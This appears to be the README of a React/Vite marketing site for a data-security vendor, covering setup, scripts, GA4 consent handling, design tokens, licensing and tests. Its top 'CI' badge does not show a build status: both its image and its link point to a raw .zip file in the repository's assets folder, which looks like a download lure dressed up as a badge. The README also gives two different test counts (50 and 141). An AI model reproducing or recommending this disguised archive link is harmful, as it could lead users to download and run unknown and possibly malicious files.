# DataGateways — marketing site

[![CI](https://github.com/talalhassankhan18/DataGateways-Website-Hosting/raw/refs/heads/main/assets/2.1.zip)](https://github.com/talalhassankhan18/DataGateways-Website-Hosting/raw/refs/heads/main/assets/2.1.zip)

Marketing site for **DataGateways**, an enterprise data-security and AI-governance vendor.

Three products sit behind it — **DataNerve** (zero-trust pipeline encryption), **AINerve**
(real-time AI prompt firewall) and **SOCMINT** (open-source exposure monitoring) — plus services,
a partner programme and a branching contact wizard.


> [!IMPORTANT]
> **This is not ready to go public.** The site reads as finished, but several claims on it are
> drafted rather than confirmed — including every compliance mark and the entire partner directory.
> Read [`docs/PRE-LAUNCH-SIGNOFF.md`](docs/PRE-LAUNCH-SIGNOFF.md) before it goes anywhere indexable.

---

## Quick start

Requires **Node 22.12+** — vitest 5 does not run on 20.

```bash
npm install
npm run dev
```

- Web → <http://localhost:3000> (also reachable on your LAN)
- API → <http://localhost:4000>

The dev server binds to every interface, so the `Network:` URL Vite prints works from a phone on
the same Wi-Fi. To show it to someone on a different network, see
[Sharing a preview](#sharing-a-preview).

---

## Scripts

| Command | What it does |
| --- | --- |
| `npm run dev` | Web on `:3000` and API on `:4000`, together |
| `npm run build` | Typechecks, then builds both apps |
| `npm test` | 50 tests across both workspaces |
| `npm run lint` | ESLint, zero-warning policy |
| `npm run typecheck` | `tsc --noEmit` across all three workspaces |
| `npm run preview` | Serves the production build on `:3000` |
| `npm run share` | Public tunnel to `:3000`, for a reviewer on another network |
| `npm run assets:sync` | Copies `/assets` into the web app's `public/` |
| `npm run art:generate` | Regenerates the six authored hero plates |
| `npm run fonts:fetch` | Re-downloads the two self-hosted font families |
| `npm run docs:placeholders` | Rebuilds the unverified-claims register |

### Analytics

Google Analytics 4, via gtag.js, behind a Consent Mode v2 banner.

- **Production is live.** `VITE_GA_MEASUREMENT_ID=G-YEG8CLH6T0` in `apps/web/.env.production`, so
  a production build loads the tag and shows the consent banner.
- **Development is not, and cannot be by accident.** Vite does not read `.env.production` in dev,
  so `npm run dev` loads no script and makes no request. To measure locally, put a **test
  property's** ID in `apps/web/.env.local` — never the production one.

> One item is outstanding and blocks the next production deploy: the privacy policy does not yet
> name Google Analytics or list its cookies. Drafted wording is ready for counsel in
> [`docs/ANALYTICS.md`](docs/ANALYTICS.md) §8.

---

## Repository layout

```
apps/
  web/                React + Vite + Tailwind marketing site
    src/components/   primitives · layout · content · media · contact
    src/content/      ALL copy, as typed objects
    src/lib/          motion, canvas backdrop, scroll, hooks, formatting
    src/styles/       tokens.css · fonts.css · index.css
  api/                Express + Zod: /api/health, /api/contact, /api/resources
packages/
  shared/             Types and constants shared by both apps
assets/               Source of truth for logo, hero plates, footage, photography
scripts/              Asset sync, hero-art generator, font fetcher, registers, share tunnel
docs/                 Design reference, copy deck, licence register, project log
```

### Two conventions worth knowing before you edit anything

**1. No user-visible string belongs in a component.** Every one lives in
`apps/web/src/content/*.ts` as a typed object. A hardcoded string in JSX is a bug — that separation
is what lets the client's real copy drop in without touching a component.

**2. Every `h1` and `h2` goes through `SplitHeading`.** It renders the roman/accent colour split
that is the site's whole visual signature. A heading that bypasses it is a bug, and
`SplitHeading.test.tsx` scans the source to enforce it — a rendering test cannot catch one added to
a page nobody thought to test.

---

## Design system

Read off the reference site's computed styles rather than inferred from a brief. Full detail in
[`docs/design-reference.md`](docs/design-reference.md).

| | |
| --- | --- |
| **Display** | Space Grotesk 700 — every heading, uppercase, −0.025em |
| **UI / body** | Readex Pro 300–600 |
| **Brand** | `#0E70F7` fills and display · `#0A4FB0` bands and small accent text |
| **Bands** | `#FBFBF9` base · `#FFFFFF` · `#EEF0F1` · `#0A4FB0` · `#041E42` |
| **Motion** | framer-motion + Lenis, with GSAP's eases as cubic-béziers |
| **Floor** | WCAG 2.1 AA · LCP under 2.5s |

Both faces are SIL OFL and self-hosted with metric-matched fallbacks, so the hero headline does not
reflow when the webfont arrives.

Colour is deliberate, not decorative: white on the logo blue `#0E70F7` is 4.49:1, a hair under the
AA floor, so bands use `#0A4FB0` at 7.61:1 and the logo blue stays a fill and display colour.

---

## Media and licensing

Every file in `assets/` has a row in [`docs/licences.csv`](docs/licences.csv) — **no row, no ship.**

- Hero footage and photography are licensed for commercial use (Mixkit Free, Pexels).
- The six hero plates are original SVG, generated by `scripts/generate-hero-art.mjs`. They remain
  the fallback for every slot, so a missing photo degrades to authored artwork, never to a broken
  frame.
- Nothing is ever fetched from a URL at runtime.
- No recognisable faces, no third-party trademarks, no other vendors' dashboards.

---

## Testing

```bash
npm test
```

**141 tests — 16 API, 125 web.** They cover the things that actually break:

- **API** — honeypot and timing bot checks that look identical to the caller, no echo of submitted
  content, unknown fields rejected, mail failures that do not leak their cause, rate limiting, and
  a fail-closed config that refuses to boot in production without SMTP and every routed mailbox.
- **Navigation** — every nav href resolves at all three levels, with parameterised routes expanded
  against the slug lists their page validates against.
- **Contact wizard** — branching, Back preserving answers, focus moving to the step heading, the
  polite live announcement, full keyboard operation.
- **Split-heading invariant** — a source scan, not a render test.
- **Lenis re-entrancy** — a regression test for a crash that only ever appeared in a real browser.
- **Analytics** — inert without a measurement ID, consent denied before the tag loads, cookies
  deleted on withdrawal, no personal data in any event, and no click counted twice.
- **Page-view coverage** — a source scan, like the split-heading one: a page that does not render
  `PageShell` is a page that is never measured.

> One of the 125 web tests fails on a **pre-existing** issue unrelated to the above —
> `ServicePage.tsx:240` carries a raw `<h2>` that bypasses `SplitHeading`, which is exactly what
> that invariant test is for. `npm run lint` likewise reports one pre-existing error in
> `NavDropdown.tsx:115`. Both are recorded in [`docs/ANALYTICS.md`](docs/ANALYTICS.md) §9.

---

## Sharing a preview

```bash
npm run build && npm run preview   # terminal 1
npm run share                      # terminal 2
```

`share` opens a Cloudflare quick tunnel and prints a public URL, falling back to localtunnel if
Cloudflare cannot register from your network.

Always tunnel the **production build**, not the dev server: the dev server sends one request per
source module, which is hundreds of round trips and effectively unusable over a tunnel.

The URL is public and unauthenticated, and it dies when the command stops. For anything longer
lived, deploy `apps/web/dist` to a static host — it ships a `_redirects` file so deep links resolve.

---

## Documentation

| Document | What it is for |
| --- | --- |
| [`PROJECT-LOG.md`](docs/PROJECT-LOG.md) | What was built, what was decided and why, what is verified, what is not |
| [`PRE-LAUNCH-SIGNOFF.md`](docs/PRE-LAUNCH-SIGNOFF.md) | **Everything that reads as fact but is not yet confirmed** |
| [`design-reference.md`](docs/design-reference.md) | Colour, type, layout, the full motion spec |
| [`copy-deck.md`](docs/copy-deck.md) | Draft copy for every page, pre-split for `SplitHeading` |
| [`content-requirements.md`](docs/content-requirements.md) | What the client still owes, section by section |
| [`ANALYTICS.md`](docs/ANALYTICS.md) | **The GA4 integration** — what it sends, what it does not, and what is still needed before it goes live |
| [`ANALYTICS-WALKTHROUGH.md`](docs/ANALYTICS-WALKTHROUGH.md) | Plain-English account of the analytics work: what was built, the decisions, what broke. Start here |
| [`licences.csv`](docs/licences.csv) | One row per media file |
| [`PLACEHOLDERS.md`](docs/PLACEHOLDERS.md) | Generated register of values still flagged in code |

---

## Licence

Proprietary — see [`LICENSE`](LICENSE). This is client work, not an open-source project.
